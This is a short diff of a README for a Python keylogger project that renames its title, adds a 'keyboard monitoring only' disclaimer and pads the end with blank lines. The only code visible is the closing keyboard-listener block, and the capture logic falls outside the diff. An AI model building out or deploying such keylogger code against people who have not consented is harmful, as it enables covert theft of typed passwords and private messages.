@@ -1,6 +1,9 @@
-# python_keylogger
+#basic_python_keylogger
 All commands for the keylogger using python
 
+[N.B--All commands are only for keyboard monitoring]
+
+#----From_Sayan
 
 So let's start
 
@@ -21,3 +24,11 @@ def on_press(key):
 with Listener(on_press=on_press) as listener:
     listener.join()
 
+
+
+
+
+                                                          
+                                                          
+                                                          
+                                                   
